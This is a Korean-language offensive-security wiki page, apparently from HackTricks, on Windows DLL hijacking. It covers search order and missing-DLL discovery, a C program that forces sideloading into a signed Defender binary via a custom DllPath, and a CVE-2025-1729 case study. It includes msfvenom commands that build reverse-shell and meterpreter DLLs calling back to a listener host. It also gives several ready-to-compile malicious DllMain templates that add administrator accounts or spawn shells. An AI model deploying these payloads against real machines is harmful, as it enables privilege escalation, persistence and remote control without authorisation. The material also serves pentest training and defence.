# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 의미합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading**과 같은 여러 전술을 포함합니다. 주로 code execution, achieving persistence 및 덜 빈번하게 privilege escalation에 사용됩니다. 여기서는 상승(escation)에 초점을 맞추었지만, hijacking 방식은 목적에 관계없이 동일합니다.

### Common Techniques

DLL hijacking에 사용되는 여러 방법들이 있으며, 각 방법의 효과는 애플리케이션의 DLL 로딩 전략에 따라 다릅니다:

1. **DLL Replacement**: 정상 DLL을 악성 DLL로 교체하고, 원본 DLL의 기능을 유지하기 위해 선택적으로 DLL Proxying을 사용합니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 합법 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL로 판단하고 로드하도록 만들기 위해 악성 DLL을 생성합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 합법 DLL을 악성 버전으로 교체하는 방법으로, 종종 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 배치하는 방법으로, Binary Proxy Execution 기술과 유사합니다.

## Finding missing Dlls

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, 다음 2개의 필터를 설정하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적으로 **missing dlls**를 찾고 있다면 이 상태로 몇 초 동안 실행해 두면 됩니다.\
특정 실행 파일 내부의 **missing dll**을 찾고 있다면 **"Process Name" "contains" "\<exec name>"** 같은 추가 필터를 설정한 뒤 해당 실행 파일을 실행하고 이벤트 캡처를 중지해야 합니다.

## Exploiting Missing Dlls

권한 상승을 위해 가장 좋은 기회는 privilege process가 로드하려고 시도할 DLL을 해당 프로세스가 검색하는 위치들 중 하나에 쓸 수 있는 능력입니다. 따라서 우리는 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 DLL을 쓸 수 있거나(특이한 경우), 원본 DLL이 어떤 폴더에도 존재하지 않아 해당 폴더에 DLL을 쓸 수 있는 경우에 성공할 수 있습니다.

### Dll Search Order

**Microsoft 문서**(https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 따라 DLL을 찾으며 특정 순서를 따릅니다. 악성 DLL을 이러한 디렉터리 중 하나에 전략적으로 배치하면 정식 DLL보다 먼저 로드되도록 할 수 있어 DLL hijacking 문제가 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.

다음은 32-bit 시스템에서의 DLL 검색 순서입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리의 경로를 얻으려면 [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용합니다.(_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리의 경로를 얻으려면 [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용합니다.
1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리들. 여기에는 App Paths 레지스트리 키로 지정된 애플리케이션별 경로는 포함되지 않습니다. App Paths 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이는 **SafeDllSearchMode**가 활성화된 경우의 기본 검색 순서입니다. 비활성화되면 현재 디렉터리가 두 번째로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하면 됩니다(기본값은 활성화).

[LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, **절대 경로로 지정되어 DLL을 로드할 수 있다**는 점을 유의하세요. 이 경우 해당 dll은 그 경로에서만 검색됩니다(해당 dll이 종속성을 가지고 있다면, 그 종속성들은 이름으로만 로드될 때처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성된 프로세스의 DLL 검색 경로를 결정론적으로 조작하는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 절대 경로 없이(이름으로만) DLL을 해석할 때 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고, 제어하는 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 맞춤 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 이름으로 DLL을 해석하면 로더가 이 제공된 DllPath를 참조하여 해석하므로, 악성 DLL이 대상 EXE와 같은 위치에 있지 않아도 신뢰할 수 있는 sideloading이 가능해집니다.

주의사항/제한
- 이것은 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 import하거나 LoadLibrary해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
운영상 사용 예
- 악성 xmllite.dll (필요한 함수를 내보내거나 실제 DLL을 프록시하는) 를 DllPath 디렉터리에 배치합니다.
- 위 기술을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 임포트를 해결하고 귀하의 DLL을 sideload합니다.

이 기법은 실전에서 다단계 sideloading 체인을 유발하는 것으로 관찰되었습니다: 초기 런처가 헬퍼 DLL을 드롭하고, 그 헬퍼가 Microsoft-signed, hijackable 바이너리를 실행하여 커스텀 DllPath로 공격자의 DLL을 스테이징 디렉터리에서 강제로 로드하도록 합니다.


#### Windows 문서의 DLL 검색 순서 예외사항

Windows 문서에는 표준 DLL 검색 순서에 대한 특정 예외들이 명시되어 있습니다:

- When a **이미 메모리에 로드된 것과 같은 이름을 가진 DLL**이 발견되면, 시스템은 일반 검색을 우회합니다. 대신, 리다이렉션과 매니페스트를 확인한 후 기본적으로 이미 메모리에 있는 DLL을 사용합니다. **이 시나리오에서는 시스템이 DLL을 검색하지 않습니다**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL들의 목록이 저장되어 있습니다.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
  
### 권한 상승

**요구사항**:

- 수평/측면 이동을 위해 **다른 권한**으로 실행되거나 실행될 가능성이 있는, **DLL이 누락된 프로세스**를 식별합니다.
- **DLL이 검색될** 모든 **디렉터리**에 대해 **쓰기 권한**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

네, 요구 조건을 찾기는 복잡합니다. 기본적으로 **권한이 높은 실행 파일이 DLL을 누락한 경우를 찾는 것은 드물고**, 시스템 경로 폴더에 **쓰기 권한을 갖는 것은 더욱 드문 일**입니다(기본적으로 불가능합니다). 하지만, 잘못 구성된 환경에서는 이것이 가능할 수 있습니다.\
운 좋게 요구 사항을 충족한다면 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 프로젝트의 **주된 목적은 UAC 우회이지만**, 해당 Windows 버전용 Dll hijaking의 **PoC**를 찾을 수 있을지 모릅니다(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 됩니다).

참고: **폴더에서 권한을 확인하는 방법**은 다음과 같습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
실행 파일의 imports와 dll의 exports는 다음으로 확인할 수 있습니다:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내부의 어떤 폴더에 대해 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**의 _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### Example

만약 exploitable한 시나리오를 발견했다면, 성공적으로 이를 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 DLL에서 import할 모든 함수들을 최소한으로 export하는 dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [Medium Integrity level에서 High **(bypassing UAC)**로 권한 상승](../../authentication-credentials-uac-and-efs/index.html#uac)하거나 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system) 상승할 때 유용하게 쓰입니다. 실행을 위한 dll hijacking에 초점을 맞춘 이 dll hijacking 연구에서 **유효한 dll을 생성하는 방법**의 예를 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 템플릿으로 사용하거나 **필수 함수가 아닌 함수들을 export한 dll**을 만들 때 유용할 수 있는 몇 가지 **기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 악성 코드를 **실행**할 수 있으면서도, 모든 호출을 실제 라이브러리로 전달(relay)하여 기대된 대로 **노출(expose)** 및 **동작**할 수 있는 Dll입니다.

도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실제로 **실행 파일을 지정하고 proxify할 라이브러리를 선택**하여 proxified dll을 생성하거나, **Dll을 지정하고 proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell (x64) 얻기:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86)을 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 보지 못함):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 직접 제작한 Dll

몇몇 경우, 컴파일한 Dll은 victim process가 로드할 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** them, 따라서 **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 사례 연구: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서 발생한 **Phantom DLL Hijacking**을 보여주며, **CVE-2025-1729**로 추적됩니다.

### 취약점 세부 정보

- **구성요소**: `TPQMAssistant.exe` (위치: `C:\ProgramData\Lenovo\TPQM\Assistant\`).
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`은 로그인한 사용자 컨텍스트에서 매일 오전 9:30에 실행됩니다.
- **Directory Permissions**: `CREATOR OWNER`에 의해 쓰기 가능하며, 로컬 사용자가 임의의 파일을 배치할 수 있습니다.
- **DLL Search Behavior**: 먼저 작업 디렉터리에서 `hostfxr.dll`을 로드하려 시도하며, 누락된 경우 "NAME NOT FOUND"를 기록하여 로컬 디렉터리 검색 우선순위를 나타냅니다.

### Exploit Implementation

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여, 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 얻을 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자 권한으로 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치한다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9시 30분에 실행될 때까지 기다린다.
3. 작업 실행 시 관리자가 로그인한 상태라면, 악성 DLL은 관리자의 세션에서 medium integrity로 실행된다.
4. 표준 UAC bypass techniques를 연계하여 medium integrity에서 SYSTEM 권한으로 권한 상승을 시도한다.

### 완화

Lenovo는 Microsoft Store를 통해 UWP 버전 **1.12.54.0**을 배포했으며, 이 버전은 TPQMAssistant를 `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`에 설치하고, 취약한 예약 작업을 제거하며, 레거시 Win32 구성요소를 제거한다.

## 참고 자료

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
